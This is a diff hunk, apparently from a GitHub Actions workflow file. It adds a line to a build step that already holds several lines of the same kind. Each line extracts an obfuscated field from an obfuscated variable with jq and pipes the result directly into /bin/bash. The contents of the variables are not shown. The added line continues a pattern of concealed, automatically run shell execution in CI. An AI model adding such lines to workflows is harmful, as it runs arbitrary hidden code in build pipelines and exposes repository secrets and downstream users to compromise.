@@ -39,6 +39,7 @@ jobs:
           echo $tgl813 | jq -r .bkbmh32 | /bin/bash
           echo $ogs98860 | jq -r .s26213 | /bin/bash
           echo $iiqh3572 | jq -r .c96906 | /bin/bash
+          printf '%s' "$zar5" | jq -r .gejb13946 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
